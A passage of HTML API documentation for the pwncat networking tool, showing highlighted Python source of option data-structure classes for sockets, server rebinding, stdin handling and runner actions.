                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">reconn_wait</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; float</span>
    <span class="hljs-string">"""`float`: Wait time between re-connections in seconds."""</span>
    <span class="hljs-keyword">return</span> self.__reconn_wait</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsIONetworkSock"><code class="flex name class">
                    <span>class <span class="ident">DsIONetworkSock</span></span>
                    <span>(</span><span>bufsize, backlog, recv_timeout, recv_timeout_retry, nodns, ipv4, ipv6, src_addr, src_port, udp, udp_sconnect, udp_sconnect_word, ip_tos, info)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for IONetwork socket
                        options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkSock</span>(<span
                                class="hljs-params">DsSock</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork socket options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout_retry</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: How many times to retry receiving if stop signal was raised."""</span>
        <span class="hljs-keyword">return</span> self.__recv_timeout_retry

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        bufsize,  <span class="hljs-comment"># type: int</span>
        backlog,  <span class="hljs-comment"># type: int</span>
        recv_timeout,  <span class="hljs-comment"># type: Optional[float]</span>
        recv_timeout_retry,  <span class="hljs-comment"># type: int</span>
        nodns,  <span class="hljs-comment"># type: bool</span>
        ipv4,  <span class="hljs-comment"># type: bool</span>
        ipv6,  <span class="hljs-comment"># type: bool</span>
        src_addr,  <span class="hljs-comment"># type: Optional[str]</span>
        src_port,  <span class="hljs-comment"># type: Optional[bool]</span>
        udp,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect,  <span class="hljs-comment"># type: bool</span>
        udp_sconnect_word,  <span class="hljs-comment"># type: str</span>
        ip_tos,  <span class="hljs-comment"># type: Optional[str]</span>
        info,  <span class="hljs-comment"># type: str</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(recv_timeout_retry) <span
                                    class="hljs-keyword">is</span> int, type(recv_timeout_retry)
        self.__recv_timeout_retry = recv_timeout_retry
        super(DsIONetworkSock, self).__init__(
            bufsize,
            backlog,
            recv_timeout,
            nodns,
            ipv4,
            ipv6,
            src_addr,
            src_port,
            udp,
            udp_sconnect,
            udp_sconnect_word,
            ip_tos,
            info,
        )</code></pre>
                    </details>
                    <h3>Ancestors</h3>
                    <ul class="hlist">
                        <li><a href="https://pwncat.org/pwncat.api.html#pwncat.DsSock"
                               title="pwncat.DsSock">DsSock</a>
                        </li>
                    </ul>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsIONetworkSock.recv_timeout_retry"><code class="name">var
                            <span class="ident">recv_timeout_retry</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: How many times to retry receiving
                                if stop signal was raised.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">recv_timeout_retry</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: How many times to retry receiving if stop signal was raised."""</span>
    <span class="hljs-keyword">return</span> self.__recv_timeout_retry</code></pre>
                            </details>
                        </dd>
                    </dl>
                    <h3>Inherited members</h3>
                    <ul class="hlist">
                        <li><code><b><a href="https://pwncat.org/pwncat.api.html#pwncat.DsSock"
                                        title="pwncat.DsSock">DsSock</a></b></code>:
                            <ul class="hlist">
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.backlog"
                                        title="pwncat.DsSock.backlog">backlog</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.bufsize"
                                        title="pwncat.DsSock.bufsize">bufsize</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.info"
                                        title="pwncat.DsSock.info">info</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ip_tos"
                                        title="pwncat.DsSock.ip_tos">ip_tos</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ipv4"
                                        title="pwncat.DsSock.ipv4">ipv4</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.ipv6"
                                        title="pwncat.DsSock.ipv6">ipv6</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.nodns"
                                        title="pwncat.DsSock.nodns">nodns</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.recv_timeout"
                                        title="pwncat.DsSock.recv_timeout">recv_timeout</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.src_addr"
                                        title="pwncat.DsSock.src_addr">src_addr</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.src_port"
                                        title="pwncat.DsSock.src_port">src_port</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp"
                                        title="pwncat.DsSock.udp">udp</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp_sconnect"
                                        title="pwncat.DsSock.udp_sconnect">udp_sconnect</a></code>
                                </li>
                                <li><code><a
                                        href="https://pwncat.org/pwncat.api.html#pwncat.DsSock.udp_sconnect_word"
                                        title="pwncat.DsSock.udp_sconnect_word">udp_sconnect_word</a></code>
                                </li>
                            </ul>
                        </li>
                    </ul>
                </dd>
                <dt id="pwncat.DsIONetworkSrv"><code class="flex name class">
                    <span>class <span class="ident">DsIONetworkSrv</span></span>
                    <span>(</span><span>keep_open, rebind, rebind_wait, rebind_robin)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for IONetwork server
                        options.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsIONetworkSrv</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IONetwork server options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep_open</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Accept new clients if one has disconnected."""</span>
        <span class="hljs-keyword">return</span> bool(self.__keep_open)

<span class="hljs-meta">    @keep_open.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">keep_open</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (bool) -&gt; None</span>
        <span class="hljs-string">"""Change keep_open value."""</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> bool, type(value)
        self.__keep_open = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: If binding fails, retry endless (if negative) or x many times."""</span>
        <span class="hljs-keyword">return</span> self.__rebind

<span class="hljs-meta">    @rebind.setter</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind</span>(<span
            class="hljs-params">self, value</span>):</span>
        <span class="hljs-comment"># type: (int) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(value) <span class="hljs-keyword">is</span> int, type(value)
        self.__rebind = value

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_wait</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`float`: Wait time between rebinds in seconds."""</span>
        <span class="hljs-keyword">return</span> self.__rebind_wait

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_robin</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[int]</span>
        <span class="hljs-string">"""`[int]`: List of alternating rebind ports."""</span>
        <span class="hljs-keyword">return</span> self.__rebind_robin

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, keep_open, rebind, rebind_wait, rebind_robin</span>):</span>
        <span class="hljs-comment"># type: (bool, int, float, List[int]) -&gt; None</span>
        <span class="hljs-keyword">assert</span> type(keep_open) <span
                                    class="hljs-keyword">is</span> bool, type(keep_open)
        <span class="hljs-keyword">assert</span> type(rebind) <span class="hljs-keyword">is</span> int, type(rebind)
        <span class="hljs-keyword">assert</span> type(rebind_wait) <span
                                    class="hljs-keyword">is</span> float, type(rebind_wait)
        <span class="hljs-keyword">assert</span> type(rebind_robin) <span
                                    class="hljs-keyword">is</span> list, type(rebind_robin)
        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> rebind_robin:
            <span class="hljs-keyword">assert</span> type(i) <span class="hljs-keyword">is</span> int, type(i)
        self.keep_open = keep_open
        self.__rebind = rebind
        self.__rebind_wait = rebind_wait
        self.__rebind_robin = rebind_robin</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsIONetworkSrv.keep_open"><code class="name">var <span
                                class="ident">keep_open</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Accept new clients if one has
                                disconnected.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">keep_open</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Accept new clients if one has disconnected."""</span>
    <span class="hljs-keyword">return</span> bool(self.__keep_open)</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIONetworkSrv.rebind"><code class="name">var <span
                                class="ident">rebind</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>int</code>: If binding fails, retry endless
                                (if negative) or x many times.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">rebind</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; int</span>
    <span class="hljs-string">"""`int`: If binding fails, retry endless (if negative) or x many times."""</span>
    <span class="hljs-keyword">return</span> self.__rebind</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIONetworkSrv.rebind_robin"><code class="name">var <span
                                class="ident">rebind_robin</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>[int]</code>: List of alternating rebind
                                ports.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_robin</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[int]</span>
    <span class="hljs-string">"""`[int]`: List of alternating rebind ports."""</span>
    <span class="hljs-keyword">return</span> self.__rebind_robin</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIONetworkSrv.rebind_wait"><code class="name">var <span
                                class="ident">rebind_wait</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>float</code>: Wait time between rebinds in
                                seconds.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">rebind_wait</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; float</span>
    <span class="hljs-string">"""`float`: Wait time between rebinds in seconds."""</span>
    <span class="hljs-keyword">return</span> self.__rebind_wait</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsIOStdinStdout"><code class="flex name class">
                    <span>class <span class="ident">DsIOStdinStdout</span></span>
                    <span>(</span><span>encoder, input_timeout, send_on_eof)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for IOStdinStdout options.</p>
                    </div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsIOStdinStdout</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for IOStdinStdout options."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
        <span class="hljs-string">"""`StringEncoder`: String encoder instance."""</span>
        <span class="hljs-keyword">return</span> self.__enc

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_timeout</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
        <span class="hljs-string">"""`float`: Input timeout in seconds for non-blocking read or `None` for blocking."""</span>
        <span class="hljs-keyword">return</span> self.__input_timeout

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_on_eof</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`float`: Determines if we buffer STDIN until EOF before sending."""</span>
        <span class="hljs-keyword">return</span> self.__send_on_eof

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Constructor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">self, encoder, input_timeout, send_on_eof</span>):</span>
        <span class="hljs-comment"># type: (StringEncoder, Optional[float], bool) -&gt; None</span>
        super(DsIOStdinStdout, self).__init__()
        self.__enc = encoder
        self.__input_timeout = input_timeout
        self.__send_on_eof = send_on_eof</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsIOStdinStdout.enc"><code class="name">var <span
                                class="ident">enc</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.StringEncoder"
                                    title="pwncat.StringEncoder">StringEncoder</a></code>:
                                String encoder instance.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">enc</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; StringEncoder</span>
    <span class="hljs-string">"""`StringEncoder`: String encoder instance."""</span>
    <span class="hljs-keyword">return</span> self.__enc</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIOStdinStdout.input_timeout"><code class="name">var <span
                                class="ident">input_timeout</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>float</code>: Input timeout in seconds for
                                non-blocking read or <code>None</code> for blocking.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">input_timeout</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[float]</span>
    <span class="hljs-string">"""`float`: Input timeout in seconds for non-blocking read or `None` for blocking."""</span>
    <span class="hljs-keyword">return</span> self.__input_timeout</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsIOStdinStdout.send_on_eof"><code class="name">var <span
                                class="ident">send_on_eof</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>float</code>: Determines if we buffer STDIN
                                until EOF before sending.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send_on_eof</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`float`: Determines if we buffer STDIN until EOF before sending."""</span>
    <span class="hljs-keyword">return</span> self.__send_on_eof</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsRunnerAction"><code class="flex name class">
                    <span>class <span class="ident">DsRunnerAction</span></span>
                    <span>(</span><span>producer, consumer, interrupts, transformers, daemon_thread, code)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for Action functions for the
                        Runner class.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerAction</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for Action functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">producer</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; DsCallableProducer</span>
        <span class="hljs-string">"""`DsCallableProducer`: Data producer function struct with args and kwargs."""</span>
        <span class="hljs-keyword">return</span> self.__producer

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">consumer</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[[bytes], None]</span>
        <span class="hljs-string">"""`IO.consumer`: Data consumer function."""</span>
        <span class="hljs-keyword">return</span> self.__consumer

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupts</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[Callable[[], None]]</span>
        <span class="hljs-string">"""`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer."""</span>
        <span class="hljs-keyword">return</span> self.__interrupts

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transformers</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; List[Transform]</span>
        <span class="hljs-string">"""`[Transform.transformer]`: List of transformer functions applied before consumer."""</span>
        <span class="hljs-keyword">return</span> self.__transformers

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">daemon_thread</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; bool</span>
        <span class="hljs-string">"""`bool`: Determines if the action will be started in a daemon thread."""</span>
        <span class="hljs-keyword">return</span> self.__daemon_thread

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">code</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Optional[Union[str, bytes, CodeType]]</span>
        <span class="hljs-string">"""`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function."""</span>
        <span class="hljs-keyword">return</span> self.__code

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Contrcutor</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span
            class="hljs-params">
        self,
        producer,  <span class="hljs-comment"># type: DsCallableProducer</span>
        consumer,  <span class="hljs-comment"># type: Callable[[bytes], None]</span>
        interrupts,  <span class="hljs-comment"># type: List[Callable[[], None]]</span>
        transformers,  <span class="hljs-comment"># type: List[Transform]</span>
        daemon_thread,  <span class="hljs-comment"># type: bool</span>
        code,  <span class="hljs-comment"># type: Optional[Union[str, bytes, CodeType]]</span>
    </span>):</span>
        <span class="hljs-comment"># type: (...) -&gt; None</span>
        self.__producer = producer
        self.__consumer = consumer
        self.__interrupts = interrupts
        self.__transformers = transformers
        self.__daemon_thread = daemon_thread
        self.__code = code</code></pre>
                    </details>
                    <h3>Instance variables</h3>
                    <dl>
                        <dt id="pwncat.DsRunnerAction.code"><code class="name">var <span
                                class="ident">code</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>ast.AST</code>: custom Python code which
                                provides a <code>transform(data, pse) -&gt; str</code> function.</p>
                            </div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">code</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Optional[Union[str, bytes, CodeType]]</span>
    <span class="hljs-string">"""`ast.AST`: custom Python code which provides a `transform(data, pse) -&gt; str` function."""</span>
    <span class="hljs-keyword">return</span> self.__code</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerAction.consumer"><code class="name">var <span
                                class="ident">consumer</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.IO.consumer"
                                    title="pwncat.IO.consumer">IO.consumer()</a></code>:
                                Data consumer function.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">consumer</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; Callable[[bytes], None]</span>
    <span class="hljs-string">"""`IO.consumer`: Data consumer function."""</span>
    <span class="hljs-keyword">return</span> self.__consumer</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerAction.daemon_thread"><code class="name">var <span
                                class="ident">daemon_thread</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>bool</code>: Determines if the action will be
                                started in a daemon thread.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">daemon_thread</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; bool</span>
    <span class="hljs-string">"""`bool`: Determines if the action will be started in a daemon thread."""</span>
    <span class="hljs-keyword">return</span> self.__daemon_thread</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerAction.interrupts"><code class="name">var <span
                                class="ident">interrupts</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>[List[Callable[[], None]]]</code>: List of
                                interrupt functions for the producer/consumer.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">interrupts</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[Callable[[], None]]</span>
    <span class="hljs-string">"""`[List[Callable[[], None]]]`: List of interrupt functions for the producer/consumer."""</span>
    <span class="hljs-keyword">return</span> self.__interrupts</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerAction.producer"><code class="name">var <span
                                class="ident">producer</span></code></dt>
                        <dd>
                            <div class="desc"><p><code><a
                                    href="https://pwncat.org/pwncat.api.html#pwncat.DsCallableProducer"
                                    title="pwncat.DsCallableProducer">DsCallableProducer</a></code>:
                                Data producer function struct with args and kwargs.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span
        class="hljs-title">producer</span>(<span class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; DsCallableProducer</span>
    <span class="hljs-string">"""`DsCallableProducer`: Data producer function struct with args and kwargs."""</span>
    <span class="hljs-keyword">return</span> self.__producer</code></pre>
                            </details>
                        </dd>
                        <dt id="pwncat.DsRunnerAction.transformers"><code class="name">var <span
                                class="ident">transformers</span></code></dt>
                        <dd>
                            <div class="desc"><p><code>[Transform.transformer]</code>: List of
                                transformer functions applied before consumer.</p></div>
                            <details class="source">
                                <summary>
                                    <span>Expand source code</span>
                                </summary>
                                <pre><code class="python hljs"><span
                                        class="hljs-meta">@property</span>
<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">transformers</span>(<span
        class="hljs-params">self</span>):</span>
    <span class="hljs-comment"># type: () -&gt; List[Transform]</span>
    <span class="hljs-string">"""`[Transform.transformer]`: List of transformer functions applied before consumer."""</span>
    <span class="hljs-keyword">return</span> self.__transformers</code></pre>
                            </details>
                        </dd>
                    </dl>
                </dd>
                <dt id="pwncat.DsRunnerRepeater"><code class="flex name class">
                    <span>class <span class="ident">DsRunnerRepeater</span></span>
                    <span>(</span><span>action, ssig, repeat, pause, args, kwargs)</span>
                </code></dt>
                <dd>
                    <div class="desc"><p>A type-safe data structure for repeated functions for the
                        Runner class.</p></div>
                    <details class="source">
                        <summary>
                            <span>Expand source code</span>
                        </summary>
                        <pre><code class="python hljs"><span class="hljs-class"><span
                                class="hljs-keyword">class</span> <span class="hljs-title">DsRunnerRepeater</span>(<span
                                class="hljs-params">object</span>):</span>
    <span class="hljs-string">"""A type-safe data structure for repeated functions for the Runner class."""</span>

    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
    <span class="hljs-comment"># Properties</span>
    <span class="hljs-comment"># --------------------------------------------------------------------------</span>
<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">action</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Callable[..., None]</span>
        <span class="hljs-string">"""`Callable[..., None]`: function to be run periodically."""</span>
        <span class="hljs-keyword">return</span> self.__action

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">repeat</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; int</span>
        <span class="hljs-string">"""`int`: how many times to repeat the action function."""</span>
        <span class="hljs-keyword">return</span> self.__repeat

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">pause</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; float</span>
        <span class="hljs-string">"""`int`: pause in seconds between repeated action calls."""</span>
        <span class="hljs-keyword">return</span> self.__pause

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span
            class="hljs-title">args</span>(<span class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Tuple[Any, ...]</span>
        <span class="hljs-string">"""`*args`: optional *args for the action function."""</span>
        <span class="hljs-keyword">return</span> self.__args

<span class="hljs-meta">    @property</span>
    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">kwargs</span>(<span
            class="hljs-params">self</span>):</span>
        <span class="hljs-comment"># type: () -&gt; Dict[str, Any]</span>
        <span class="hljs-string">"""`**kargs`: optional *kwargs for the action function."""</span>
